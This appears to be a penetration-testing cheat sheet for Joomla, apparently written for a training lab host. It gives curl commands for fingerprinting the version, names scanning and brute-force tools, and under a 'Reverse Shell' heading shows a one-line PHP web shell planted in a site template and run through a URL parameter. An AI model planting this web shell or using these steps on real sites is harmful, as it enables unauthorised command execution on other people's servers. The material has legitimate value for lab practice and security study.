# Discovery/Footprinting
```
curl -s http://dev.inlanefreight.local/ | grep Joomla
curl -s http://dev.inlanefreight.local/robots.txt 
curl -s http://dev.inlanefreight.local/README.txt
# Js version
curl -s http://dev.inlanefreight.local/media/system/js/
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
# Cache
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml
```

# Droopescan
Automate recon
```
droopescan scan joomla --url http://dev.inlanefreight.local/
```
# Joomlascan
Tool: [joomlascan](https://github.com/OWASP/joomscan)

# Joomla-brute
[Brute forcing](https://github.com/ajnik/joomla-bruteforce)

# Reverse Shell

We have to edit a tmeplate to insert

```
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

then
```
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

```
